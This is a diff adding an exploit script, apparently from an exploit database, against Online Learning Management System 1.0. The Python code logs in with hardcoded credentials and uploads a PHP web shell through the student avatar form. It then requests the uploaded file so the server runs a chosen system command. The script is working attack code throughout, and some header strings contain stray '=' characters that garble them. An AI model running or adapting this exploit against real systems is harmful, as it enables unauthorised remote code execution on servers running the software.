@@ -1,0 +1,32 @@
+# Exploit Title: Online Learning Management System 1.0 - RCE (Authenticated)
+# Date: 01.01.2021
+# Exploit Author: Bedri Sertkaya
+# Vendor Homepage: https://www.sourcecodester.com/php/7339/learning-management-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=7339&title=Online+Learning+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested on: Windows 10 / WAMP Server
+
+import requests
+
+cmd = "start cmd.exe" # Command to execute
+target = "http://192.168.1.101/lms" #
+username = "21100867"
+password = "heni"
+# Login and get session_cookie
+url = target+"/login.php"
+headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-A=gent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML=, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://192.168.1.10=1", "Referer": "http://192.168.1.101/lms/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+data = {"username": username, "password": password}
+s = requests.post(url, headers=headers, data=data)
+session_cookie = s.cookies.get_dict()
+
+# Upload Shell
+burp0_url = target+"/student_avatar.php"
+burp0_cookies = session_cookie
+burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.1.101", "Content-Type": "multipart/form-data; boundary----WebKitFormBoundarybHBgGwgOFblz5IgL", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0=.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.101/lms/student_notification.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
+burp0_data = "------WebKitFormBoundarybHBgGwgOFblz5IgL\r\nContent-Disposition: form-data; name=\"image\"; filename=\"exploit.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\r\nshell_exec('"+cmd+"');\r\n------WebKitFormBoundarybHBgGwgOFblz5IgL\r\nContent-Disposition: form-data; name=\"change\"\r\n\r\n\r\n------WebKitFormBoundarybHBgGwgOFblz5IgL--\r\n"
+requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+# Trigger exploit
+trigger_url = "http://192.168.1.101:80/lms/admin/uploads/exploit.php"
+trigger_cookies = session_cookie
+requests.get(trigger_url, cookies=trigger_cookies)
